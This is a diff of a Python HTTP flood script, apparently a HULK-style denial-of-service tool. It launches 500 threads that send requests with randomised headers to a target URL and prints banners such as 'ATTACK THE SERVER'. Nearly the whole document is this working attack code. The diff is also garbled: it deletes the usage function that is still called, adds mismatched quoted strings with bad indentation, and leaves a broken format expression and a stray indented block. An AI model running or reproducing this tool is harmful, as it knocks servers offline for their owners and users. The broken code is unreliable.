@@ -1,3 +1,5 @@
+import os
+import time
 import urllib2
 import sys
 import threading
@@ -25,7 +27,7 @@ def set_safe():
 	global safe
 	safe=1
 	
-# generates a user agent array
+
 def useragent_list():
 	global headers_useragents
 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
@@ -51,19 +53,19 @@ def referer_list():
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
 	
-#builds random ascii string
+
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
-		a = random.randint(65, 90)
+		a = random.randint(95, 165)
 		out_str += chr(a)
 	return(out_str)
 
-def usage():
-  	print(f"\033[33mUSAGE python termulkobam.py [url]")
-    
+os.system("clear")
+print("""
+print("\033[33m®®®®®®®®®®®®®®®®®
+""")
 
-	
 #http request
 def httpcall(url):
 	useragent_list()
@@ -83,12 +85,14 @@ def httpcall(url):
 	request.add_header('Host',host)
 	try:
 			urllib2.urlopen(request)
-	except (urllib2.HTTPError, e):
+	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print('Response Code 500')
+		    print("""
+			print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-='
+			""")
 			code=500
-	except (urllib2.URLError, e):
+	except urllib2.URLError, e:
 			#print e.reason
 			sys.exit()
 	else:
@@ -105,21 +109,20 @@ class HTTPThread(threading.Thread):
 				code=httpcall(url)
 				if (code==500) & (safe==1):
 					set_flag(2)
-		except (Exception, ex):
+		except Exception, ex:
 			pass
 
-# monitors http threads and counts requests
 class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+100<request_counter) & (previous><request_counter):
-				print(f"%d Requests Sent" % (request_counter)
+			if (previous+500<request_counter) & (previous<>request_counter):
+				print("\033[97m%d  ATTACK THE SERVER --> %" (request_counter)
 				previous=request_counter
 		if flag==2:
-			print(f"\n-- iccont attackinished --")
+			print("\n-- Attack Finished --")
 
-#execute 
+
 if len(sys.argv) < 2:
 	usage()
 	sys.exit()
@@ -128,15 +131,14 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print("Sakaw Attack Started")
-		if len(sys.argv)== 3:
+		print("_<--  ATTACK STARTED --->")
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
-		host = m.group(1)
+		m = re.search('(https?\://)?([^/]*)/?.*', url)
+		host = m.group(2)
 		for i in range(500):
 			t = HTTPThread()
 			t.start()
